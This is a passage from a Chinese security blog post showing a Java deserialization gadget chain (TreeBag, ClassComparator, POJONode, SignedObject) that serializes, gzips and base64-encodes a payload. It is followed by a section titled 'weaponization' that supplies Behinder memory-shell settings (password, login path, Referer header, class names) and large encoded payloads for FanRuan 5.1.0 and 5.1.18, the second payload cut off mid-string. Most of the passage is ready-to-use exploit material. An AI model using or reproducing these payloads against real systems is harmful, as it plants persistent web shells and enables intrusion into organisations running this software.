ctClass.removeMethod(writeReplace);</span><br><span class="line">        ctClass.toClass();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 二次反序列化</span></span><br><span class="line">        KeyPairGenerator kpg = KeyPairGenerator.getInstance(<span class="string">"DSA"</span>);</span><br><span class="line">        kpg.initialize(<span class="number">1024</span>);</span><br><span class="line">        KeyPair kp = kpg.generateKeyPair();</span><br><span class="line">        <span class="keyword">final</span> SignedObject dsa = <span class="keyword">new</span> SignedObject(queue, kp.getPrivate(), Signature.getInstance(<span class="string">"DSA"</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">//        dsa.getObject();</span></span><br><span class="line">        POJONode node = <span class="keyword">new</span> POJONode(dsa);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        final VersionComparator versionComparator = new VersionComparator();</span></span><br><span class="line"><span class="comment">//        versionComparator.compare(node, node);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> ClassComparator classComparator = <span class="keyword">new</span> ClassComparator(<span class="string">"org.freehep.util.VersionComparator"</span>);</span><br><span class="line"><span class="comment">//        classComparator.compare(node, node);</span></span><br><span class="line">        <span class="keyword">final</span> TreeBag treeBag = <span class="keyword">new</span> TreeBag(classComparator);</span><br><span class="line">        treeBag.add(-<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 反射修改 root 属性的key</span></span><br><span class="line">        <span class="keyword">final</span> Class&lt;?&gt; superclass = treeBag.getClass().getSuperclass();</span><br><span class="line">        <span class="keyword">final</span> Field map = superclass.getDeclaredField(<span class="string">"map"</span>);</span><br><span class="line">        map.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        <span class="keyword">final</span> Map treeMap = (Map) map.get(treeBag);</span><br><span class="line">        <span class="keyword">final</span> Field root = treeMap.getClass().getDeclaredField(<span class="string">"root"</span>);</span><br><span class="line">        root.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        <span class="keyword">final</span> Map.Entry  mapEnter = (Map.Entry) root.get(treeMap);</span><br><span class="line">        <span class="keyword">final</span> Class&lt;? extends Map.Entry&gt; aClass = mapEnter.getClass();</span><br><span class="line">        <span class="keyword">final</span> Field key = aClass.getDeclaredField(<span class="string">"key"</span>);</span><br><span class="line">        key.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        key.set(mapEnter, node);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//  序列化</span></span><br><span class="line">        ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(baos);</span><br><span class="line">        oos.writeObject(treeBag);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> ByteArrayOutputStream byteArrayOutputStream = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        <span class="keyword">final</span> GZIPOutputStream gzipOutputStream = <span class="keyword">new</span> GZIPOutputStream(byteArrayOutputStream);</span><br><span class="line">        gzipOutputStream.write(baos.toByteArray());</span><br><span class="line">        gzipOutputStream.finish();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> String encodeToString = Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());</span><br><span class="line">        System.out.println(encodeToString);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//        // 执行反序列化</span></span><br><span class="line">        <span class="keyword">final</span> ByteArrayInputStream bais = <span class="keyword">new</span> ByteArrayInputStream(baos.toByteArray());</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(bais);</span><br><span class="line">        ois.readObject();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th><img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="https://hexo-1253463144.cos.ap-chongqing.myqcloud.com/image-20240305193442814.png" alt="image-20240305193442814"></th>
</tr>
</thead>
</table>
<h3 id="武器化：打内存马"><a href="#武器化：打内存马" class="headerlink" title="武器化：打内存马"></a>武器化：打内存马</h3><h4 id="帆软-5-1-0-打冰蝎内存马"><a href="#帆软-5-1-0-打冰蝎内存马" class="headerlink" title="帆软 5.1.0 打冰蝎内存马"></a>帆软 5.1.0 打冰蝎内存马</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">密码: Oknfbivaa</span><br><span class="line">地址: /webroot/decision/login</span><br><span class="line">请求头: Referer: Reudjmcj</span><br><span class="line">脚本类型: JSP</span><br><span class="line">内存马类名: org.apache.commons.lang.AbstractMatcherSjpListener</span><br><span class="line">注入器类名: ch.qos.logbacke.StringUtil</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">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</span><br></pre></td></tr></table></figure>

<h4 id="帆软-5-1-18-打冰蝎内存马"><a href="#帆软-5-1-18-打冰蝎内存马" class="headerlink" title="帆软 5.1.18 打冰蝎内存马"></a>帆软 5.1.18 打冰蝎内存马</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">密码: Oknfbivaa</span><br><span class="line">地址: /webroot/decision/login</span><br><span class="line">请求头: Referer: Reudjmcj</span><br><span class="line">脚本类型: JSP</span><br><span class="line">内存马类名: org.apache.commons.lang.AbstractMatcherSjpListener</span><br><span class="line">注入器类名: ch.qos.logbacke.StringUtil</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">H4sIAAAAAAAAAJ17CZwcV3nn9+bq1mgk2SNL9gjf+JCnpelzuqfHxnaf0/d9yyCqq6u7q7u6qruq+gwoBDDOsZuEAEkMhoBDrIQ42AZ2JKNgYzbYibNhIQmJF8IGQrI5WLIbsgentd+r7hnNSCMHVr+Z6ur3vve97/h/x6saPfltmFVkWJbk2grTZtg6t8JKrZYkKvgpCByr8vS+zNRWMjLHuZnae983fOGVv/+qMA0waOPS1yH9SlVGEoVb8QiMonikVpuRGVWS3/D5Xzz4q8O2YwpIBPaxdDLGtDgVFiMNpscYBUasGdOqzIu1ewdtFW6nYlRxnzrXXumqvLCS42QFJbjEsj8DAAT3XZ3sq9Z5ubJSZRSVkwctYaXBsE1FElcqjMqUebGyIkoVbiURD8VjeAPjf1OaRHOne4zQvUyceLmBWt87kMH+E+2Qo6x2bEGm0EAyOH8iJm40YgiHL+dDDX2MyriicGxX5tXhSpqviVxlLO2+i5+pL9/35YtTMH0KdKwkqpyoqjB1yn0K9ilIyKhdmevAGViIwIJa5xihJiGXeouOTQ/aXZkSP/mv1393Tp/5urYjgDH55Bgd12s7a/5IyDxdOEx2uS733q+YPvWDB97+zDRMBWFG4UdcBObZbVepcHRsV7rSeMmF91LmMIWMDXvArswxIl2grLjx7tKqb37kZ/9Juf2jgSmY2rUL1QB9qW/LUpuT1eFVwEVBrqlBh1fGw3d40NxBUeFEhVf5HrcDZdMPvfWhxN99QbOECtdIXbXdVRPjLXhO0VA4jTzXqXuVrriyQ5MBg3us8OgEWWSElYEiqOyKKjODlQzXaguMyilB/NyXj78gPvm71mmYC8KB04gBdFqs2ypzchAOnsYFoiJwahDHB6dg/nR5qHIs4kJR0cvUs3OntYhChU/t0FgLwXsjMHtaxFCj1pmJwLWnL9dgt3MujY+dAxfxH4KCbhT+0dKRWu2rjgkqgOwJlpOLL7/66edw2kzeSuAYWzd2JMUoSLUyAp2b+CGLe+mAEHgQzWZEsxnRbMax2Yya2YxbZjNqZjPKXVHlW5zRVVbQIKyamVhFB9MEFmqc6tlKKgSuO37PlZ4nMONBoxGw7IE1DQtbrKOMinNyutGO8BilIifrQU/gEG5Cw9JuG3MkMO8bsFxbS4wEDms78pIxGN8e1sECgWsuF0UHB8n+vw3YlKBr618oV+Byg6x5UDBEGol+veUzsTmXL1OJS9m8r7jhS0c9McGVLNaiWbbCN0MN0xpXdCdtTGmtbLKmNgYNi5pu5VflbqYSc6azctniL5fj4Xq2aBimY6qlUIkZre2u1WhMV2I9Y4+LRl19PmF12mJWq6NhFeOGiqHkEKwiThqKikvteqsuyRwqjvhmW0ipKZezPSxvDErRYHRQKfjYcF01RZLRXDnh6ShZc3AUZuxSqyS0HUlvMucpxvJSvGOzNxu9RqclWkL4vRAIhqwevtCQSlFrik/YzUXJJo0cznSsbS2nWsmi5E+37PFQPpKXk+GuvS0ZXNVqvORPFrrhoiiobofJEvd2Rb8rUByMBqohY46lbKJF9q0GKhZTyxIb+IbudtthrPY5NcE3+lw8sMFKPrM5Y/I7ncFOIRVm+vG238wXgmoq3BQDEW87nLJLEVOr4GByjC3qSSUTqquVS1WL9bJiYENpY6DrkLLhhJCqN4qpStjqUW1lj4U3OjfYZjjhaQ2GVr8larWtDhL5QEluc2XPgPXFhKE/VhMTlq65xW2EOolAKZrn7VVnOd